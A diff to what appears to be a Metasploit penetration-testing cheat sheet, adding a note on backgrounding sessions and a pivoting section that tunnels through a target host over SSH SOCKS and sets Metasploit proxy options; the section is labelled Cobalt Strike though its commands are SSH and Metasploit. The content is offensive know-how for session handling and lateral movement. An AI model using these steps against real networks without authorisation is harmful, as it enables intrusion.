@@ -82,7 +82,6 @@ show advanced
 set lhost <attacker IP>       Set the listner to the attacker's IP.
 set lport 443                 Set the listening port to 443.
 exploit                       Run the exploit.
-sessions -l                   List all active sessions.
 ------------------------------------------------------------------------------------------------------
 
 # Cross platform exploit
@@ -137,6 +136,7 @@ For example:
 
 sessions -l                                   Show active sessions.
 sessions -i 2                                 Interact with session 2.
+ctrl z                                        Put the session in the background and go back to the MSF.
 ------------------------------------------------------------------------------------------------------
 
 # Post exploitation - establish awareness
@@ -314,6 +314,13 @@ set RHOSTS 10.0.0.0/24
 set PORTS 445
 set THREADS 10
 run
+
+# Pivoting with Cobalt Strike
+
+ssh -D 1080 user@targetIP
+Open a new tab:
+     setg Proxies socks4:127.0.0.1:1080
+     setg ReverseAllowProxy true
 ------------------------------------------------------------------------------------------------------
 
 # msfvenom
